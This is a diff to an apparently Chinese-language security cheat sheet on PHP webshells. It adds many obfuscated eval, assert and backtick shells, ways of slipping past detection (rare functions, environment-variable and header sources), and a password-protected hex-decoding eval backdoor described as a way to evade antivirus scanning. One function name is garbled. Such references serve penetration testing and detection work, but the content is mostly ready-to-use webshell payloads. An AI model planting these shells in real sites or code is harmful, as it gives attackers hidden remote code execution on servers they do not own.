@@ -8,31 +8,115 @@ WebShell
 - ``$_FILE``
     - ``eval($_FILE['name']);``
 - 拆分
-    - ``assert(${"_PO"."ST"} ['sz']);``
+    - ``eval(${"_PO"."ST"} ['sz']);``
 - 动态函数执行
     - ``$k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);``
+    - ``$a=$_GET['a'];$a($_GET['b']);``
 - create_function
     - ``$function = create_function('$code',strrev('lave').'('.strrev('TEG_$').'["code"]);');$function();``
 - preg_replace
-- rot13
-- base64
+- 变形
+    - str_replace(" ", "e v a l")
 - 进制转化
     - ``"\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145"``
+- 进制运算
+    - ``("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");``
+- 自增运算
+    - ``$a="a";$a++;``
+- 强制类型转换
+    - ``$a='';$a.=[]; // Array``
 - 利用文件名
     - ``__FILE__``
+- 注释
+    - ``$a="e"."v"./*-/*-*/"a"./*-*/"l";``
+- 反射
+    - ``ReflectionFunction``
+
+Bypass
+--------------------------------
+- 基于少见函数
+    - ``mb_eregi_replace('.*',$_GET[1],'','e');``
+- 基于污染传播
+    - ``putenv($_GET["c"]);eval(getenv('path'));``
+- 基于少见源
+    - ``$a = filter_input(INPUT_GET,'c');``
+    - ``eval(end(getallheaders()));``
+
+字符串变形函数
+--------------------------------
+- str_replace
+- str_rot13
+- strtok
+- strtolower
+- strtoupper
+- strtr
+- substr
+- substr_replace
+- trim
+- ucfirst
+- ucwords
+
+回调函数
+--------------------------------
+- array_filter
+- array_map
+- array_reduce
+- array_walk
+- array_walk
+- array_walk_recursive
+- call_user_func
+- call_user_func_array
+- filter_var
+- filter_var_array
+- preg_replace_callback
+- register_tick_function
+- registregister_shutdown_function
+- uasort
+- uksort
+
+加解密函数
+--------------------------------
+- mcrypt_encrypt
+- openssl_encrypt
+
+其他执行方式
+--------------------------------
+- FFI
+- SimpleXML
+- SimpleXMLElement
+
+自定义函数
+--------------------------------
+使用自定义的加解密函数，在一定程度上可以绕过一些防护软件的查杀，下面的代码是一个基于十六进制的执行的简单例子。
+
+.. code:: php
+
+    $string = '';
+    $password = 'password';
+    if(isset($_POST[$password])){
+        $hex = $_POST[$password];
+        for($i = 0; $i < strlen($hex) - 1; $i += 2) {
+            $string .= chr(hexdec($hex[$i] . $hex[$i + 1]));
+        }
+    }
+    eval($string);
 
 特殊字符Shell
 --------------------------------
 PHP的字符串可以在进行异或、自增运算的时候，会直接进行运算，故可以使用特殊字符来构成Shell。
 
-::
+.. code:: php
+
+    <?=`{${~"\xa0\xb8\xba\xab"}[~"\xa0"]}`;
+
+.. code:: php
 
     @$_++;
     $__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");
     @${$__}[!$_](${$__}[$_]);
 
 
-::
+.. code:: php
 
     $_=[];
     $_=@"$_"; // $_='Array';
